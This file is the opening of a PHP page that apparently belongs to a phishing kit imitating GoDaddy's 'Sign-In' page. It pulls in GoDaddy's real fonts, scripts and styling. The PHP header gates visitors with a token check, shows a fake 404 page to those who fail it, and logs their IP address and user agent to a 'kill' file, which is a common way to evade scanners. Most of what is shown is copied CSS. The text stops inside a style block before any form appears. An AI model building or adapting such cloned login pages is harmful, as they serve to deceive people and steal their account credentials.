<?php
    require_once '../Vendor/Modernized.php';
    require_once '../Vendor/Pullers.php';
    require_once '../Vendor/Laravel.php';

    $Modernizeds = new Modernized;
    $Pullers = new Pullers;

    if (!$Modernizeds->checkToken()) {
        echo $Pullers->throw404();
        $Modernizeds->log(
            "../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $Modernizeds->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }
    
?>
<html lang="en" dir="ltr" class="footer-html">
<head>
    <meta charset="UTF-8">
    <title>Sign-In</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://unpkg.com/@elastic/apm-rum@5.9.1/dist/bundles/elastic-apm-rum.umd.min.js"></script>
    <link href="//img6.wsimg.com/ux/favicon/manifest.json" rel="manifest">
    <link rel="apple-touch-icon" sizes="57x57" href="//img6.wsimg.com/ux/favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="//img6.wsimg.com/ux/favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="76x76" href="//img6.wsimg.com/ux/favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="//img6.wsimg.com/ux/favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="//img6.wsimg.com/ux/favicon/apple-icon-152x152.png">
    <link rel="icon" type="image/png" sizes="192x192" href="//img6.wsimg.com/ux/favicon/android-icon-192x192.png">
    <link rel="preload" href="https://img6.wsimg.com/wrhs/65e723d1323a15a62b64824a8d885bac/uxcore2.min.css" as="style"
        integrity="sha384-imNIVLUJIGdjJ3Il6mBCGq/fGTJGXXQfl9wlzY2qIwzvlyZJylsZ8GAuxoKDxnUc" crossorigin="anonymous">
    <link rel="preload" href="https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSherpa-vf4.woff2" as="font"
        type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSage-bold.woff2" as="font"
        type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSage-regular.woff2" as="font"
        type="font/woff2" crossorigin="anonymous">
    <link rel="stylesheet" href="https://img6.wsimg.com/wrhs/65e723d1323a15a62b64824a8d885bac/uxcore2.min.css"
        integrity="sha384-imNIVLUJIGdjJ3Il6mBCGq/fGTJGXXQfl9wlzY2qIwzvlyZJylsZ8GAuxoKDxnUc" crossorigin="anonymous">
    <style data-styled="active" data-styled-version="5.3.11">
        .zfCle {
            padding-top: 40px;
        }
        #form-header #brand-header-template #brand-logo-resizer, #form-header #brand-header-template #brand-logo-resizer svg {
    min-height: 1.5rem;
    max-height: 1.5rem;
}
    </style>

    <style>
        :root {
            --ux-1s0t9v0: 0.7023319615912209rem;
            --ux-vvspv2: 1rem;
            --ux-xwz0yz: 1.2;
            --ux-97h3vl: #d4dbe0;
            --ux-19wr3kq: 1px;
            --ux-1067ph9: 'gdsherpa', Helvetica, Arial, sans-serif;
            --ux-sm2he3: 500;
            --ux-1w31hux: 1.5;
            --ux-1fi898z: #708090;
            --ux-le566q: #999;
            --ux-16m8zm9: #905;
            --ux-ci632o: #690;
            --ux-1jw5w47: #9a6e3a;
            --ux-ps2t1y: #07a;
            --ux-1b06mhh: #DD4A68;
            --ux-gw3pxw: #e90;
            --ux-2domxp: #d6d6d6;
            --ux-2jubes: 4px;
            --ux-wikx71: #1976d2;
            --ux-1np4r62: transparent;
            --ux-1q7rsup: 2px;
            --ux-oc0naw: 1rem;
            --ux-16aixzc: 1rem;
            --ux-18ime9a: 1.375rem;
            --ux-1le7uoa: #111;
            --ux-1fzd9l5: transparent;
            --ux-jg1026: 1.5rem;
            --ux-1s5tndb: 0;
            --ux-cao06b: #fff;
            --ux-1leynsm: #111;
            --ux-by6mab: #767676;
            --ux-3lhizs: 1px;
            --ux-k4t5bc: #00a4a6;
            --ux-yscvvt: #ef6c0f;
            --ux-3seoiy: #744bc4;
            --ux-ifyf3f: #aa6d00;
            --ux-1c4rju4: #1976d2;
            --ux-1qsbael: #db1802;
            --ux-vsd31q: #00a4a6;
            --ux-1afwtm7: #ef6c0f;
            --ux-3uv4tc: #744bc4;
            --ux-iievdt: #aa6d00;
            --ux-cxbe8g: 1rem;
            --ux-ekirkm: #f5f2f0;
            --ux-145pjib: #000;
            --ux-jqgd0i: #111;
            --ux-1pfsknb: 1.423828125rem;
            --ux-1smybcz: .875rem;
            --ux-1dbu8ei: #111;
            --ux-1nr6ynb: 500;
            --ux-1lxyxj9: normal;
            --ux-1oqjeuu: 0;
            --ux-10jlyin: #000;
            --ux-99lo9: #1976d2;
            --ux-ux0m8o: #db1802;
            --ux-1wlhylv: transparent;
            --ux-p4h24g: .875rem;
            --ux-9ic57q: 2rem;
            --ux-9wtaa3: 'gdsherpa', Helvetica, Arial, sans-serif;
            --ux-3z6ccd: 500;
            --ux-hm1ty7: 1.5;
            --ux-15ks663: 'gdsherpa', Helvetica, Arial, sans-serif;
            --ux-aarlu5: 700;
            --ux-h93mi7: 1.5;
            --ux-p4wcd9: 'gdsherpa', Helvetica, Arial, sans-serif;
            --ux-1a9e4a3: 500;
            --ux-1pw8hzd: 1.25;
            --ux-11opjp5: 2;
            --ux-1n2ego0: .8rem;
            --ux-uzt9o6: 0;
            --ux-gfnupv: 'gdsherpa', Helvetica, Arial, sans-serif;
            --ux-j40yyd: 700;
            --ux-jw5s9j: 1.5;
            --ux-12zlqr9: .875rem;
            --ux-1wbe5uo: .75rem;
            --ux-1owc8nc: transparent;
            --ux-ut3xrx: #09757a;
            --ux-f7kpiw: #00a4a6;
            --ux-1gutwvn: 'gdsherpa', Helvetica, Arial, sans-serif;
            --ux-g9ierp: 500;
            --ux-1dje42v: 1.5;
            --ux-shg991: 'gd-sage', "Times New Roman", serif;
            --ux-c539b7: 500;
            --ux-p25s1t: 1.25;
            --ux-1klxlj4: 1rem;
            --ux-1q1acnc: .875rem;
            --ux-uoagkw: 500;
            --ux-1jw1vht: #bac0c3;
            --ux-bs151i: #d6d6d6;
            --ux-acokjr: #d8efef;
            --ux-1jc2o1e: #004249;
            --ux-vhce6u: #d6d6d6;
            --ux-195rcgy: 500;
            --ux-1g1i1da: #2b2b2b;
            --ux-1nu8itt: #fff;
            --ux-1glcx6s: #2b2b2b;
            --ux-1szqg1n: #111;
            --ux-1p4dc1z: transparent;
            --ux-14n8p36: #1976d2;
            --ux-1bul8sw: 500;
            --ux-11du3iw: 500;
            --ux-1qbop1h: 900;
            --ux-1c9yx5s: #bac0c3;
            --ux-2okpka: #bac0c3;
            --ux-1xliuhi: #00a4a6;
            --ux-iz7fvt: transparent;
            --ux-1ygxynm: 2px;
            --ux-1no0ng9: #fff;
            --ux-1rwkbsh: transparent;
            --ux-2rqapw: #09757a;
            --ux-117cu43: 'gdsherpa', Helvetica, Arial, sans-serif;
            --ux-8n6y9x: 500;
            --ux-mgbt9j: 1.5;
            --ux-1ouw3v4: #e20087;
            --ux-y66o47: #111;
            --ux-2lqd62: .75rem;
            --ux-bt2zqe: 700;
            --ux-1qbn65p: #f4f8fc;
            --ux-1ds8u13: transparent;
            --ux-1bdtclp: transparent;
            --ux-1frurfw: 0;
            --ux-kdwujq: #111;
            --ux-77zzwv: #00A4A6;
            --ux-1lv81i7: 1.2rem;
            --ux-28rjk: 500;
            --ux-1x4w1cu: #f5f5f5;
            --ux-1oqmm01: 1em;
            --ux-vk6635: #d6d6d6;
            --ux-y3mv0: #d6d6d6;
            --ux-e0ldzz: #00a63f;
            --ux-1woug6n: #444444;
            --ux-ceou01: #DB1802;
            --ux-io2uwb: transparent;
            --ux-1vw9arb: #d6d6d6;
            --ux-1i7a912: #d3c1f7;
            --ux-b0nj5b: transparent;
            --ux-18hc5o7: transparent;
            --ux-16apl5s: 2;
            --ux-1zta3b: #f4f8fc;
            --ux-1llin8a: 1.25em;
            --ux-7a9pn9: 700;
            --ux-1qsry5z: normal;
            --ux-1tx8bkn: #600801;
            --ux-1gpjrd8: #d6d6d6;
            --ux-1p5s1n4: #111;
            --ux-1nx9aml: #2b2b2b;
            --ux-1im0suq: #000;
            --ux-11i8wqh: #fff;
            --ux-1kpdpz9: transparent;
            --ux-1nk9qds: #767676;
            --ux-13yftfi: transparent;
            --ux-4kfa9g: transparent;
            --ux-492jj: transparent;
            --ux-ez3zlc: transparent;
            --ux-1ysi6jp: #111;
            --ux-ji3i29: 700;
            --ux-11ovj8p: .875rem;
            --ux-emb11o: #004249;
            --ux-7g160m: transparent;
            --ux-9qpf6c: #00a4a6;
            --ux-h6e7c1: #fff;
            --ux-1sw32wb: transparent;
            --ux-1wf60ri: #111;
            --ux-1a8ld87: #111;
            --ux-1e4z3ma: transparent;
            --ux-cup4ju: #d8efef;
            --ux-1kyybpb: #09757a;
            --ux-1ld6fs6: .875rem;
            --ux-1xzzhyl: #111;
            --ux-16dmnu8: #767676;
            --ux-94p9fm: 500;
            --ux-1mh0ktr: #f4f8fc;
            --ux-1utwv7e: #111;
            --ux-15qjz45: transparent;
            --ux-1e85ids: #09757a;
            --ux-1m7qrkf: #f5f7f8;
            --ux-unx9i2: #00a4a6;
            --ux-c5mlr8: #111;
            --ux-t04p4h: #fff;
            --ux-sywk25: #00A4A6;
            --ux-1lw8azc: #fff;
            --ux-1rfp50t: #ddeaf8;
            --ux-1u2jy43: #f4f8fc;
            --ux-1b26o0z: #fff;
            --ux-em0gr: #9fffb8;
            --ux-1tgn1ki: #ffeea9;
            --ux-ako3l5: #111;
            --ux-7j9lri: #f5f7f8;
            --ux-1v7sr65: transparent;
            --ux-11cn5p4: #00a4a6;
            --ux-772dne: .875rem;
            --ux-1hfks3w: 500;
            --ux-xkgc86: #2b2b2b;
            --ux-16m4m3i: #767676;
            --ux-1marogz: #DB1802;
            --ux-17htz86: #fff;
            --ux-5g19it: #00a4a6;
            --ux-l7zq7p: #f5f7f8;
            --ux-vuekow: #111;
            --ux-1iiiqs3: #ffbbbb;
            --ux-bsmnmn: #fbd9ed;
            --ux-60ig31: transparent;
            --ux-1ymu8yg: #111111;
            --ux-mk2ln9: #d6d6d6;
            --ux-c9uvim: #09757a;
            --ux-187j9dd: #f4f8fc;
            --ux-1x4s92c: transparent;
            --ux-19xthpq: transparent;
            --ux-1hnbfne: #00a4a6;
            --ux-1r87102: #fff;
            --ux-w7826f: #111;
            --ux-7wu8i7: #111;
            --ux-1o8cusa: #fff;
            --ux-18lg5k: #a6fff8;
            --ux-qnydfw: #111;
            --ux-e5ryhe: #111;
            --ux-1pqaqki: #E20087;
            --ux-1mph5ru: #111;
            --ux-l48e4z: #111;
            --ux-3i0zzw: transparent;
            --ux-10kwq3t: #09757a;
            --ux-ivu8ja: #f5f7f8;
            --ux-1j87vvn: #09757a;
            --ux-9i7okd: #F5F7F8;
            --ux-1xxygco: #5E5E5E;
            --ux-pdb1vi: #111;
            --ux-15ftva1: 80%;
            --ux-3rg0ia: #bac0c3;
            --ux-tnqad1: #09757a;
            --ux-1a9r6d0: #fff;
            --ux-8mso75: #111;
            --ux-1fqyphw: bold;
            --ux-11zd9di: 1.2;
            --ux-18hlgn4: #f4f8fc;
            --ux-bg7olm: #f4f8fc;
            --ux-w3lhdp: #600801;
            --ux-1331zgr: #111;
            --ux-bgke81: #444;
            --ux-xaxxaq: #111;
            --ux-1ygutpa: #111;
            --ux-1rklle7: #2b2b2b;
            --ux-1gm3rf3: rgba(0, 0, 0, .425);
            --ux-5jg1u4: normal;
            --ux-1utwyy9: #444;
            --ux-uyojp0: 500;
            --ux-1njwmlo: #111;
            --ux-1novelo: #ae1302;
            --ux-n0tova: #AE1302;
            --ux-5mgu1z: #444;
            --ux-1ixzvrg: #00a4a6;
            --ux-5n4ibx: #d4dbe0;
            --ux-1iwsz6x: #111;
            --ux-t61743: #1BDBDB;
            --ux-13vrbmz: #fff;
            --ux-1xeg43i: #111;
            --ux-asxrqp: #aab7c2;
            --ux-170hi5o: #f5f7f8;
            --ux-yp4309: #09757a;
            --ux-sji811: #00a63f;
            --ux-lt9ehq: normal;
            --ux-11sf7bz: transparent;
            --ux-1hei7eo: #db1802;
            --ux-1ykdrsm: transparent;
            --ux-17vlskq: transparent;
            --ux-1she0w: #111;
            --ux-9cqgfr: #00a4a6;
            --ux-h8m2iq: #fff;
            --ux-8qoawt: #111;
            --ux-kkdx4n: #111;
            --ux-17fhz5j: #2b2b2b;
            --ux-1oppzsi: transparent;
            --ux-1tqourc: transparent;
            --ux-1sjqecz: #f5f5f5;
            --ux-a6rxy5: #00a4a6;
            --ux-144ksq0: #fff;
            --ux-1c5c9sy: #09757a;
            --ux-16d2ul: #db1802;
            --ux-6wr86x: #aab7c2;
            --ux-15lh0hn: transparent;
            --ux-19kzpv5: transparent;
            --ux-gdy377: #f4f8fc;
            --ux-k4fkva: #111;
            --ux-1tn536u: transparent;
            --ux-1jz8rn7: #09757a;
            --ux-1x1u50s: #f5f7f8;
            --ux-1mntjax: #09757a;
            --ux-1ehwjjs: #00a4a6;
            --ux-1uyxcq5: #fff;
            --ux-953c7l: #111;
            --ux-1wp39lq: #00A4A6;
            --ux-1pvg8dx: #00a4a6;
            --ux-18vqnuy: #09757a;
            --ux-car98n: #db1802;
            --ux-j6fbnm: #111;
            --ux-qebq9u: #f4f8fc;
            --ux-6gm31z: #111;
            --ux-11rtwg8: #f4f8fc;
            --ux-1e4ese5: #111;
            --ux-926l8f: #600801;
            --ux-17znn9m: #fff;
            --ux-vhbo95: #111;
            --ux-lrwu2k: #fff;
            --ux-ran6wz: #444;
            --ux-1ckzto6: #fff;
            --ux-1ely98k: #111;
            --ux-1vtao7i: #111;
            --ux-18qj45h: transparent;
            --ux-1vjximi: #db1802;
            --ux-14gkznj: #744bc4;
            --ux-15isxca: #fff;
            --ux-st77: #111;
            --ux-17841cp: #111;
            --ux-83yt9q: #ae1302;
            --ux-tt846z: #fff;
            --ux-1q4q36s: #AE1302;
            --ux-9cq6k1: #fff;
            --ux-ix2s5q: #00a4a6;
            --ux-19ykcyj: #fff;
            --ux-1iqicpb: rgba(245, 245, 245, 0.9);
            --ux-c3e9y2: #111;
            --ux-1uiriv5: transparent;
            --ux-1i83650: #111;
            --ux-44qvxk: #111;
            --ux-rm5d87: #d8efef;
            --ux-lgzajt: #09757a;
            --ux-16t61pw: #fff;
            --ux-104sznl: #111;
            --ux-1qc7xgo: #F5F7F8;
            --ux-1uh76vx: #111;
            --ux-vqhzzz: #fff;
            --ux-vwf4ne: #111;
            --ux-c624hh: #fff;
            --ux-1e7hthc: #09757a;
            --ux-wxwyd1: rgba(0, 0, 0, 0.425);
            --ux-i4fj7k: #fff;
            --ux-1lpd00q: #613ea3;
            --ux-n9sg1c: transparent;
            --ux-1gkt6kl: #1BDBDB;
            --ux-1ar08ze: transparent;
            --ux-h6e91r: #1BDBDB;
            --ux-1txna61: #E8EAEB;
            --ux-3ujf58: #111;
            --ux-5qft0z: #E8EAEB;
            --ux-zufaee: #111;
            --ux-1d8mwhj: #00a4a6;
            --ux-9gvyua: #111;
            --ux-1ap6ofp: #db1802;
            --ux-ny8bg2: #00a63f;
            --ux-aqzfxj: #fff;
            --ux-1g47djv: #de7c00;
            --ux-yl1aqy: transparent;
            --ux-15n32fv: #fff;
            --ux-1ajy4cm: #fff;
            --ux-38c183: #111;
            --ux-1l8kymk: #fff;
            --ux-1qc8i9l: #09757a;
            --ux-1a6cjk7: transparent;
            --ux-p3e15m: #db1802;
            --ux-1f7pqen: #fff;
            --ux-10zrx9t: transparent;
            --ux-e1mf41: #145fa9;
            --ux-1m9ys0v: #767676;
            --ux-143smq7: #E20087;
            --ux-1ep3kxj: #00a63f;
            --ux-lv1r6m: #de7c00;
            --ux-1fhc073: #DB1802;
            --ux-1iwdp0z: #b4006c;
            --ux-md12r6: #00a4a6;
            --ux-177t0p3: #fff;
            --ux-cuskv8: #09757a;
            --ux-wi4oww: #fff;
            --ux-1j2zkam: #fff;
            --ux-3lso4u: #fff;
            --ux-zk0uja: #fff;
            --ux-tqp5z3: #fff;
            --ux-o3neug: #d8efef;
            --ux-1ko0ujh: #09757a;
            --ux-17o0ohq: #fff;
            --ux-s2edbm: #fff;
            --ux-1gbjqnn: #d6d6d6;
            --ux-hje0py: #111;
            --ux-c419qd: #fff;
            --ux-1vrwgqh: #09757A;
            --ux-8jybkc: #fff;
            --ux-vt3gf6: #111;
            --ux-1gzakfr: #fff;
        }

        [data-partial~="inverted"] {
            --ux-97h3vl: #282828;
            --ux-wikx71: #1976D2;
            --ux-1np4r62: transparent;
            --ux-1fzd9l5: transparent;
            --ux-cao06b: #000;
            --ux-1leynsm: #fff;
            --ux-by6mab: rgba(190, 190, 190, .75);
            --ux-k4t5bc: #145FA9;
            --ux-yscvvt: #09757A;
            --ux-eo80a7: rgba(117, 117, 117, .2);
            --ux-10jlyin: #000;
            --ux-1wlhylv: transparent;
            --ux-1owc8nc: transparent;
            --ux-ut3xrx: #fff;
            --ux-f7kpiw: #A6FFF8;
            --ux-1f7gqjo: 700;
            --ux-1nu8itt: transparent;
            --ux-1glcx6s: rgba(255, 255, 255, .85);
            --ux-1szqg1n: #fff;
            --ux-1p4dc1z: transparent;
            --ux-14n8p36: #4095E8;
            --ux-1xliuhi: #61EDEA;
            --ux-iz7fvt: #3d3d3d;
            --ux-1no0ng9: #111;
            --ux-1rwkbsh: transparent;
            --ux-2rqapw: #fff;
            --ux-1ouw3v4: #FF40B2;
            --ux-y66o47: transparent;
            --ux-1igc26q: rgba(255, 255, 255, .65);
            --ux-1qbn65p: #111;
            --ux-1ds8u13: #004249;
            --ux-1bdtclp: #004249;
            --ux-kdwujq: #fff;
            --ux-77zzwv: #1bdbdb;
            --ux-1woug6n: #DCDCDC;
            --ux-ceou01: #ff513d;
            --ux-io2uwb: #1976D2;
            --ux-1vw9arb: #3D3D3D;
            --ux-1bdyuno: #1bdbdb;
            --ux-1i7a912: #D3C1F7;
            --ux-b0nj5b: transparent;
            --ux-18hc5o7: transparent;
            --ux-1zta3b: rgba(17, 17, 17, .85);
            --ux-1b4vz3j: #3d3d3d;
            --ux-10bottm: #fff;
            --ux-1p5s1n4: #A4A4A4;
            --ux-1nx9aml: rgba(117, 117, 117, .2);
            --ux-1im0suq: #1976D2;
            --ux-11i8wqh: #000;
            --ux-1kpdpz9: transparent;
            --ux-1nk9qds: rgba(255, 255, 255, .65);
            --ux-13yftfi: transparent;
            --ux-4kfa9g: transparent;
            --ux-492jj: transparent;
            --ux-ji3i29: 500;
            --ux-11ovj8p: .875rem;
            --ux-tuo0av: #fff;
            --ux-7g160m: transparent;
            --ux-9qpf6c: #61EDEA;
            --ux-h6e7c1: #111;
            --ux-1sw32wb: #3d3d3d;
            --ux-1wf60ri: rgba(255, 255, 255, .85);
            --ux-1a8ld87: #111;
            --ux-1e4z3ma: #1976D2;
            --ux-1ld6fs6: 1rem;
            --ux-16dmnu8: rgba(255, 255, 255, .65);
            --ux-94p9fm: 500;
            --ux-1mh0ktr: #111;
            --ux-1utwv7e: #fff;
            --ux-15qjz45: #004249;
            --ux-1e85ids: #fff;
            --ux-1m7qrkf: #004249;
            --ux-unx9i2: #fff;
            --ux-c5mlr8: #fff;
            --ux-t04p4h: #111;
            --ux-sywk25: #1bdbdb;
            --ux-1lw8azc: #111;
            --ux-1rfp50t: #A9EDFF;
            --ux-1u2jy43: #BEBEBE;
            --ux-1b26o0z: #000;
            --ux-em0gr: #9FFFB8;
            --ux-1tgn1ki: #FFEEA9;
            --ux-ako3l5: transparent;
            --ux-1v7sr65: transparent;
            --ux-11cn5p4: rgba(255, 255, 255, .65);
            --ux-772dne: .875rem;
            --ux-1hfks3w: 500;
            --ux-xkgc86: #3d3d3d;
            --ux-16m4m3i: rgba(255, 255, 255, .65);
            --ux-1marogz: #ff513d;
            --ux-17htz86: #111;
            --ux-5g19it: #61EDEA;
            --ux-l7zq7p: #191919;
            --ux-vuekow: #fff;
            --ux-1iiiqs3: #FFBBBB;
            --ux-bsmnmn: #FFB3E6;
            --ux-60ig31: transparent;
            --ux-1ymu8yg: #A9EDFF;
            --ux-t2o4ct: primitives.commonMappingsDark.border.value;
            --ux-187j9dd: #61EDEA;
            --ux-1x4s92c: #191919;
            --ux-19xthpq: #282828;
            --ux-1hnbfne: #61EDEA;
            --ux-1r87102: transparent;
            --ux-w7826f: #fff;
            --ux-7wu8i7: #bebebe;
            --ux-1o8cusa: #111;
            --ux-18lg5k: #61EDEA;
            --ux-qnydfw: #111;
            --ux-e5ryhe: #111;
            --ux-1pqaqki: #FF40B2;
            --ux-1mph5ru: #111;
            --ux-l48e4z: #111;
            --ux-3i0zzw: transparent;
            --ux-10kwq3t: #4095E8;
            --ux-ivu8ja: transparent;
            --ux-1j87vvn: #4095E8;
            --ux-9i7okd: #191919;
            --ux-1xxygco: rgba(255, 255, 255, .85);
            --ux-15ftva1: 80%;
            --ux-1a9r6d0: #3d3d3d;
            --ux-8mso75: #fff;
            --ux-1fqyphw: 700;
            --ux-11zd9di: 1.2;
            --ux-18hlgn4: #282828;
            --ux-bg7olm: #282828;
            --ux-w3lhdp: #FFBBBB;
            --ux-1s3rs7c: #1976D2;
            --ux-1331zgr: #F3F3F3;
            --ux-bgke81: #F3F3F3;
            --ux-xaxxaq: #111;
            --ux-1ygutpa: #111;
            --ux-qrfwvh: rgba(255, 255, 255, .85);
            --ux-5jg1u4: normal;
            --ux-uyojp0: 500;
            --ux-v5rvar: #282828;
            --ux-out8py: #fff;
            --ux-1njwmlo: #1976D2;
            --ux-1novelo: #DB1802;
            --ux-n0tova: #DB1802;
            --ux-5mgu1z: #1976D2;
            --ux-1ixzvrg: #61EDEA;
            --ux-5n4ibx: #282828;
            --ux-1iwsz6x: #111;
            --ux-t61743: #1bdbdb;
            --ux-13vrbmz: #000;
            --ux-1xeg43i: rgba(255, 255, 255, .65);
            --ux-asxrqp: transparent;
            --ux-lt9ehq: normal;
            --ux-11sf7bz: transparent;
            --ux-1ykdrsm: transparent;
            --ux-d7y8zm: #004249;
            --ux-1s5w7av: #fff;
            --ux-1m8ale0: #004249;
            --ux-1weni2l: #fff;
            --ux-17vlskq: transparent;
            --ux-1she0w: #1976D2;
            --ux-9cqgfr: #61EDEA;
            --ux-h8m2iq: #111;
            --ux-8qoawt: #61EDEA;
            --ux-kkdx4n: #1BDBDB;
            --ux-17fhz5j: #DCDCDC;
            --ux-1oppzsi: transparent;
            --ux-1tqourc: transparent;
            --ux-1sjqecz: #111;
            --ux-16d2ul: #ff513d;
            --ux-6wr86x: rgba(255, 255, 255, .65);
            --ux-15lh0hn: transparent;
            --ux-19kzpv5: transparent;
            --ux-gdy377: #61EDEA;
            --ux-k4fkva: #111;
            --ux-1tn536u: #191919;
            --ux-1jz8rn7: #fff;
            --ux-1x1u50s: #282828;
            --ux-1mntjax: #fff;
            --ux-1ehwjjs: #61EDEA;
            --ux-1uyxcq5: #111;
            --ux-953c7l: #1976D2;
            --ux-1wp39lq: #1976D2;
            --ux-1pvg8dx: #1bdbdb;
            --ux-car98n: #ff513d;
            --ux-j6fbnm: #fff;
            --ux-qebq9u: #282828;
            --ux-6gm31z: #111;
            --ux-11rtwg8: #282828;
            --ux-1e4ese5: #fff;
            --ux-926l8f: #FFBBBB;
            --ux-17znn9m: #111;
            --ux-vhbo95: #F3F3F3;
            --ux-lrwu2k: #111;
            --ux-ran6wz: #F3F3F3;
            --ux-1ckzto6: #111;
            --ux-1ely98k: transparent;
            --ux-1vtao7i: transparent;
            --ux-18qj45h: transparent;
            --ux-1vjximi: #ff513d;
            --ux-st77: #fff;
            --ux-17841cp: #fff;
            --ux-83yt9q: #DB1802;
            --ux-tt846z: #fff;
            --ux-1q4q36s: #DB1802;
            --ux-9cq6k1: #fff;
            --ux-ix2s5q: #61EDEA;
            --ux-19ykcyj: #111;
            --ux-1iqicpb: rgba(17, 17, 17, .85);
            --ux-c3e9y2: #fff;
            --ux-1uiriv5: transparent;
            --ux-1i83650: #fff;
            --ux-44qvxk: #1976D2;
            --ux-rm5d87: #004249;
            --ux-16t61pw: #000;
            --ux-104sznl: #fff;
            --ux-1luoy6d: primitives.commonMappingsDark.elevation.1.value;
            --ux-1qc7xgo: #282828;
            --ux-1uh76vx: #fff;
            --ux-vqhzzz: rgba(117, 117, 117, .2);
            --ux-vwf4ne: #61EDEA;
            --ux-c624hh: #61EDEA;
            --ux-1e7hthc: #111;
            --ux-wxwyd1: rgba(0, 0, 0, 0.6);
            --ux-i4fj7k: #111;
            --ux-1lpd00q: #A182CE;
            --ux-n9sg1c: transparent;
            --ux-1gkt6kl: #fff;
            --ux-1ar08ze: transparent;
            --ux-h6e91r: #fff;
            --ux-1txna61: #004249;
            --ux-3ujf58: #fff;
            --ux-5qft0z: #004249;
            --ux-zufaee: #fff;
            --ux-1d8mwhj: #000;
            --ux-9gvyua: #fff;
            --ux-1ap6ofp: #ff513d;
            --ux-j1sntz: transparent;
            --ux-yl1aqy: transparent;
            --ux-15n32fv: #111;
            --ux-1ajy4cm: #191919;
            --ux-38c183: #fff;
            --ux-1l8kymk: #191919;
            --ux-1qc8i9l: #fff;
            --ux-1a6cjk7: transparent;
            --ux-o034vm: #00E356;
            --ux-10zrx9t: transparent;
            --ux-e1mf41: #4095E8;
            --ux-1m9ys0v: rgba(255, 255, 255, .65);
            --ux-143smq7: #FF40B2;
            --ux-1ep3kxj: #00E356;
            --ux-lv1r6m: #FFB800;
            --ux-1fhc073: #ff513d;
            --ux-1iwdp0z: #E20087;
            --ux-md12r6: #1bdbdb;
            --ux-177t0p3: #111;
            --ux-cuskv8: #1bdbdb;
            --ux-wi4oww: #111;
            --ux-1j2zkam: #111;
            --ux-3lso4u: #111;
            --ux-zk0uja: #111;
            --ux-tqp5z3: #000;
            --ux-1l9a5et: #fff;
            --ux-mqozyo: #111;
            --ux-o3neug: #004249;
            --ux-1ko0ujh: #fff;
            --ux-17o0ohq: #111;
            --ux-s2edbm: #fff;
            --ux-1gbjqnn: primitives.commonMappingsDark.elevation.1.value;
            --ux-hje0py: #fff;
            --ux-c419qd: #000;
            --ux-24t4e3: #004249;
            --ux-1ag0f34: rgba(255, 255, 255, .1);
            --ux-1vrwgqh: #fff;
            --ux-8jybkc: #111;
            --ux-vt3gf6: #fff;
            --ux-1gzakfr: #111;
        }
    </style>
    <style>
        /* godaddy:brand v21 prod */
        @font-face {
            font-family: 'gdsherpa';
            font-weight: 1 900;
            src: url('https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSherpa-vf4.woff2') format('woff2'), url('https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSherpa-vf4.woff2') format('woff2-variations');
            unicode-range: U+0-10FFFF;
            font-display: swap;
        }

        @font-face {
            font-family: 'gd-sage';
            font-weight: 700;
            src: url('https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSage-bold.woff2') format('woff2'), url('https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSage-bold.woff') format('woff'), url('https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSage-bold.ttf') format('truetype');
            unicode-range: U+0-10FFFF;
            font-display: swap;
        }

        @font-face {
            font-family: 'gd-sage';
            font-weight: 400;
            src: url('https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSage-regular.woff2') format('woff2'), url('https://img6.wsimg.com/ux-assets/@ux/fonts/4.5.0/GDSage-regular.woff') format('woff');
            unicode-range: U+0-10FFFF;
            font-display: swap;
        }
    </style>
    <link rel="stylesheet" media="all" href="css/utility-header.css">
    <meta name="google-site-verification" content="t7JT1iH2iscenNr74R-kgXPljL_ru6OPiT9RE8zDk04">
    <link rel="preload"
        href="https://img6.wsimg.com/auth-assets/4aa15230f448b21526337e8f365c65c3bb92f8af/login-panel.js" as="script">
    <link rel="prefetch" as="script"
        href="https://img6.wsimg.com/auth-assets/4aa15230f448b21526337e8f365c65c3bb92f8af/login-panel.js">
    <link rel="preload" href="https://img6.wsimg.com/identity-static-assets/_next/static/css/95c2f81e5812e203.css"
        as="style">
    <link rel="stylesheet" href="https://img6.wsimg.com/identity-static-assets/_next/static/css/95c2f81e5812e203.css"
        data-n-g=""><noscript data-n-css=""></noscript>
    <script defer="" nomodule=""
        src="https://img6.wsimg.com/identity-static-assets/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/chunks/webpack-a09ae2d0ab95e682.js"
        defer=""></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/chunks/main-be9a3ce76a67f23c.js"
        defer=""></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/chunks/framework-a0c46ad6a3b8da13.js"
        defer=""></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/chunks/pages/_app-34f9f05a5a21e57c.js"
        defer=""></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/chunks/12-cf29d8fb90cc6d47.js"
        defer=""></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/chunks/6502-97f98446d14ad925.js"
        defer=""></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/chunks/pages/index-e428fb5725588df9.js"
        defer=""></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/Fe7S4_9w1ICSJyYY88RRc/_buildManifest.js"
        defer=""></script>
    <script src="https://img6.wsimg.com/identity-static-assets/_next/static/Fe7S4_9w1ICSJyYY88RRc/_ssgManifest.js"
        defer=""></script>
    <style data-styled="active" data-styled-version="5.3.11"></style>
    <style data-styled="active" data-styled-version="5.3.11"></style>
    <style>
        .ux-text {
